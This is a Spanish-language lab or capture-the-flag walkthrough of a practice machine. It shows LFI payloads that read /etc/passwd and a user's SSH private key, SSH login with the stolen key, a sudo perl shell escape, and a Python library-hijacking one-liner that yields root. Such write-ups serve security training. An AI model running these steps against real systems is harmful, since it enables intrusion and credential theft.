## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones.

```bash
nmap -sV -O <IP_DEL_OBJETIVO>
```

**Resultados:**

- `22/tcp open ssh OpenSSH 9.6p1`
- `80/tcp open http Apache httpd 2.4.58`

## 2. Enumeración Web

Al acceder a la aplicación web, encontramos un mensaje indicando "By TLuisillo_o" y un error explícito `[!] ERROR [!]`, lo que sugiere que la aplicación espera un parámetro específico que no se está enviando.

Utilizamos `whatweb` para identificar tecnologías:

```bash
whatweb http://<IP_DEL_OBJETIVO>
# Apache[2.4.58], Bootstrap, HTML5, Title[4You]
```

### 2.1. Búsqueda de Directorios y Fuzzing de Parámetros

Iniciamos una búsqueda de directorios con `gobuster`:

```bash
gobuster dir -u http://<IP_DEL_OBJETIVO> -w /path/to/wordlist/directories.txt
```

Encontramos el archivo `index.php`. Al ser un archivo PHP, es probable que interactúe con el servidor mediante parámetros GET. Utilizamos `wfuzz` para descubrir parámetros ocultos, empleando un payload típico de LFI (`/etc/passwd`) para provocar una respuesta diferencial.

```bash
wfuzz -c --hl=62 -w /path/to/wordlist/big.txt 'http://<IP_DEL_OBJETIVO>/index.php?FUZZ=/etc/passwd'
```

**Salida:**
```
000002402:   200       88 L    199 W     3870 Ch    "secret"
```

El fuzzing revela el parámetro `secret`.

### 2.2. Explotación de LFI (Local File Inclusion)

Al navegar a `http://<IP_DEL_OBJETIVO>/index.php?secret=/etc/passwd`, el servidor devuelve el contenido del archivo `/etc/passwd`. Esto confirma la vulnerabilidad de **LFI**.

Identificamos los siguientes usuarios con login en el sistema:

- `root`
- `vaxei`
- `luisillo`

## 3. Acceso Inicial (SSH)

Dado que tenemos una vulnerabilidad de lectura de archivos arbitrarios (LFI) y conocemos al usuario `vaxei`, intentamos exfiltrar su clave privada SSH (`id_rsa`).

**Payload:**

```
http://<IP_DEL_OBJETIVO>/index.php?secret=../../../home/vaxei/.ssh/id_rsa
```

La aplicación devuelve la clave privada RSA. Copiamos el contenido y lo guardamos en un archivo local:

```bash
vim id_rsa_vaxei
# Pegamos el contenido de la clave
chmod 600 id_rsa_vaxei
```

Nos conectamos vía SSH utilizando la clave exfiltrada:

```bash
ssh -i id_rsa_vaxei vaxei@<IP_DEL_OBJETIVO>
```

Confirmamos el acceso:

```bash
whoami
# vaxei
```

## 4. Escalada de Privilegios

### 4.1. Escalada Horizontal (Usuario Luisillo)

En el directorio actual encontramos un archivo `file.txt` con contenido basura que no aporta credenciales válidas. Procedemos a enumerar los permisos de `sudo`.


```bash
sudo -l
```

**Resultado:**

```
User vaxei may run the following commands on 4c54b2ceac3c:
   (luisillo) NOPASSWD: /usr/bin/perl
```

El usuario `vaxei` puede ejecutar `perl` como el usuario `luisillo` sin contraseña. Consultamos GTFOBins para explotar este permiso y obtener una shell.

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

Ahora somos el usuario `luisillo`.

### 4.2. Escalada Vertical (Root)

Realizamos un reconocimiento básico como `luisillo`.

```bash
whoami
# luisillo
sudo -l
```

**Resultado:**

```
User luisillo may run the following commands on 4c54b2ceac3c:
   (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Podemos ejecutar el script `/opt/paw.py` como `root` usando `python3`. Analizamos el código fuente del script:

```bash
cat /opt/paw.py
```

Observamos que el script importa librerías estándar como `subprocess` y `os`.

```Python
import subprocess
import os
...
def run_command():
   subprocess.run(['echo Hello!'], check=True)
...
```

**Vulnerabilidad: Library Hijacking (Secuestro de Librería)** El script importa `subprocess` pero no especifica rutas absolutas y `python` busca módulos en el directorio actual antes que en las rutas del sistema (dependiendo de la configuración de `sys.path`). Dado que tenemos permisos de escritura en el directorio actual o podemos crear archivos en una ruta prioritaria, podemos crear un archivo malicioso llamado `subprocess.py`.

Creamos el exploit en el mismo directorio donde ejecutaremos el script:

```bash
echo 'import os; os.system("/bin/sh")' > subprocess.py
```

Ejecutamos el script vulnerable con `sudo`. Python importará nuestro `subprocess.py` falso en lugar de la librería legítima.

```bash
sudo /usr/bin/python3 /opt/paw.py
```

Al ejecutarse, el script lanza una shell con privilegios de `root`.

```bash
whoami
# root
```
